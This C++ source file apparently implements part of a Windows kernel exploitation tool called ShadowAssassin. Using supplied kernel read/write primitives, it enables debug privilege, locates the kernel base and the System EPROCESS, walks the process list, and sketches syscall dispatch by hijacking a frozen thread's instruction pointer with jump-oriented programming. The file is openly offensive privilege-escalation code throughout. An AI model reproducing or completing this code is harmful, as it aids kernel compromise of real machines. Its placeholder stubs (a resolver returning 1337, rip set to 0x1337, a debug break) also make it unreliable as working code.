#include "shadowassassin.h"
#include "offsets.h"


// --- Setup ---

ShadowAssassin::ShadowAssassin()
    : scratchAddress(0)
{}

void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
void ShadowAssassin::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
void ShadowAssassin::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }


UINT64 ShadowAssassin::Get_System_EPROCESS() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    //getting ntobase
    UINT64 ntobase = 0;
    LPVOID drivers[1024];
    DWORD filler;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &filler)) {
        ntobase = reinterpret_cast<uint64_t>(drivers[0]);
    }
    else {
        DbgLog("need to run as admin.\n");
    }

    UINT64 ps_system_pointer = ntobase + OFF_PS_INITIAL_SYSTEM_PROCESS;
    UINT64 result;

    readFn(&result, ps_system_pointer, 0x8);
    DbgLog("Found EPROCESS struct using sedbg at %llx\n\n", result);
    return result;
}


void ShadowAssassin::SetEPROCESS(UINT64 ep) {
    EPROCESS = ep;
}

FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }


bool ShadowAssassin::Initialize() {
    if (!readFn || !writeFn) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: readFn=%d writeFn=%d\n",
            (bool)readFn, (bool)writeFn);
        return false;
    }

    if (!EPROCESS) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: EPROCESS not set\n");
        return false;
    }

    frameManager.SetReadPrimitive(readFn);
    frameManager.SetWritePrimitive(writeFn);

    UINT64 currentEPROCESS = GetCurrentEPROCESS(EPROCESS);

	if (!currentEPROCESS) {
		DbgLog("[ShadowAssassin::Initialize] FAIL: GetCurrentEPROCESS returned 0\n");
		return false;
	}
	DbgLog("[ShadowAssassin::Initialize] Current EPROCESS=0x%llX\n", currentEPROCESS);


	frameManager.SetEPROCESS(currentEPROCESS);


    DbgLog("[ShadowAssassin::Initialize] OK: primitives wired\n");
    return true;
}


// --- Kernel export resolution ---

UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
    return 1337;
}

UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
{
    UINT32 pid = GetCurrentProcessId();
	UINT64 currentPid = 0;

	UINT64 firstEPROCESS = eprocess;

	while (true) {
		readFn(&currentPid, (UINT64)(eprocess + OFF_PID), 0x8);
		if (currentPid == pid) 
			return eprocess;

		UINT64 flink = 0;
		readFn(&flink, (UINT64)(eprocess + OFF_EPROCESS_LIST), sizeof(UINT64));
		if (!flink || flink == eprocess + OFF_EPROCESS_LIST || flink == firstEPROCESS) {
			DbgLog("[GetCurrentEPROCESS] FAIL: walked full list, PID=%u not found\n", pid);
			return 0;
		}
		eprocess = flink - OFF_EPROCESS_LIST;
	}

}


// --- Syscall dispatch ---

UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {

    UINT64 funcAddr = ResolveKernelExport(name);
    if (!funcAddr) {
        DbgLog("[CallSyscall] FAIL: ResolveKernelExport returned 0 for '%s'\n", name.c_str());
        return 0;
    }
    DbgLog("[CallSyscall] Resolved '%s' -> 0x%llX\n", name.c_str(), funcAddr);

    frameManager.CreateFrozenThread();

    UINT64 frameBase = frameManager.GetFrameAddress();
    if (!frameBase) {
        DbgLog("[CallSyscall] FAIL: frameBase is 0 after CreateFrozenThread\n");
        return 0;
    }
    DbgLog("[CallSyscall] frameBase=0x%llX\n", frameBase);

    frameManager.WriteRegister("rip", 0x1337);


    Sleep(100);
	__debugbreak();
    frameManager.ContinueThread();
    DbgLog("[CallSyscall] Thread continued, returning funcAddr=0x%llX\n", funcAddr);
    return funcAddr;
}
